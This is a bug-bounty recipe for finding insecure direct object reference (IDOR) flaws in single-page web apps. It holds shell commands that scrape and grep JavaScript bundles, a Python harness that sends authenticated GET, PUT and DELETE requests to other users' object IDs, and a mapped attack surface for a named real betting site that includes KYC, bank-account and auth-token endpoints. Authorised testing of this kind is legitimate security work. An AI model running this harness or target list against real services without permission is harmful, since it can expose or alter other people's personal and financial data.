# SPA Bundle IDOR Surface Extraction — recipe + harness skeleton

Use when: target is an opaque-token SPA (React/Vue/Next), REST API 401s
unauthenticated, and you have no victim object IDs yet. Goal: turn the minified
frontend into a concrete, token-gated IDOR test list.

## Step 1 — pull + download bundles
```bash
cd /home/user/Bugbounty/<target>
mkdir -p js_files
curl -sS --max-time 20 https://www.<target>/ -o www_index.html
# extract script srcs (path or absolute)
grep -oE '(src|href)="[^"]+\.js[^"]*"' www_index.html | sed -E 's/.*="([^"]+)"/\1/' | sort -u
# download each (absolute or relative to origin)
base="https://www.<target>"
grep -oE '/[a-zA-Z0-9_./-]+\.js' www_index.html | sort -u | while read p; do
  curl -sS --compressed -o "js_files/$(basename $p)" "$base$p"
done
```

## Step 2 — decompress (CRITICAL)
```bash
for f in js_files/*.js; do
  if [ "$(head -c2 "$f" | xxd -p | head -c4)" = "1f8b" ]; then
    mv "$f" "$f.gz" && gunzip -f "$f.gz"
  fi
done
```

## Step 3 — extract user-scoped resource paths
```bash
grep -rhoE '"/my/[a-zA-Z0-9_./{}$-]+"|"/users/[a-zA-Z0-9_./{}$-]+"' js_files/*.js \
  | tr -d '`' | sort -u > idor_surface.txt
# object-id param names (mass-assignment / IDOR)
grep -rhoE '"(raceId|userId|uid|sessionId|bettingTicketId|receiptId|transferId|messageId)"' \
  js_files/*.js | tr -d '"' | sort | uniq -c | sort -rn
```

## Step 4 — token-gated cross-account harness (fill AUTH_HEADER + 2nd-account IDs)
```python
import requests
AUTH_HEADER = "Bearer <YOUR_TOKEN>"            # from DevTools /api/ request
API_BASE    = "https://www.<target>"           # real base from that request
PROX        = "/api"                            # proxy prefix if present
VICTIM_IDS  = {"receipt":"<ID>","bet_ticket":"<ID>","message":"<ID>","transfer":"<ID>"}
H = {"Authorization": AUTH_HEADER, "Content-Type":"application/json",
     "Accept":"application/json", "User-Agent":"Mozilla/5.0"}
def url(p): return f"{API_BASE}{PROX}{p}"
eps = {
  "receipt":   f"/my/receipts/{VICTIM_IDS['receipt']}",
  "bet_ticket":f"/my/analytics/betting-tickets/{VICTIM_IDS['bet_ticket']}",
  "message":   f"/my/messages/{VICTIM_IDS['message']}",
  "transfer":  f"/my/transfers/history/{VICTIM_IDS['transfer']}",
  "bank_jp":   f"/users/-/bank-accounts/jpbank/status",
  "limit":     f"/users/me/betting-limit",
}
for name, p in eps.items():
    for m in ("GET","PUT","DELETE"):
        try:
            r = requests.request(m, url(p), headers=H, json={}, timeout=15)
            if r.status_code == 200 and "error" not in r.text.lower():
                print(f">>> IDOR? {name} {m} -> 200 {r.text[:200]}")
        except Exception as e:
            pass
```
Any `>>>` line = candidate IDOR -> reproduce in browser, then Gate 0.

## Real case: winticket.jp
- API: proxy-prefixed `/api/...`; `/api/*` 404 unauth on both www + api hosts
  (Istio/Envoy gateway). Need 1 authed request to pin exact base.
- Surface from 28 bundles: `/my/receipts/{id}`, `/my/point/history/{id}`,
  `/my/transfers/history/{id}`, `/my/messages/{id}`,
  `/my/analytics/betting-tickets/{id}`, `/my/point/charge/refund/{id}`,
  `/my/identity/*` (KYC/PII — highest value), `/users/-/bank-accounts/{9 banks}/status`,
  `/users/me/auth-token`, `/users/me/betting-limit` (PUT = state change),
  `/users/me/email`, `/users/me/short-password/reset`.
- Object params: `raceId` (x169), `uid`, `userId`.
- Verdict: edge 403/404 unauth; IDOR untestable without a session token +
  2nd test account. Harness built, ready.
